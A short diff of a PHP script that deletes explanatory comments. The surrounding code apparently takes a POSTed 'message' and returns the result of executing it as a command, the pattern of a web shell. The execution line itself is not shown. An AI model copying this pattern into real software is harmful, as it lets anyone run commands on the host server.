@@ -1,8 +1,6 @@
 <?php
-// Start output buffering
 ob_start();
 
-// Initialize response variable
 $response = '';
 
 if (isset($_POST['message'])) {
@@ -12,7 +10,6 @@ if (isset($_POST['message'])) {
     $response = $output ?: 'Error: Command execution failed.';
 }
 
-// Clean (erase) the output buffer and turn off output buffering
 ob_end_clean();
 
 echo $response;
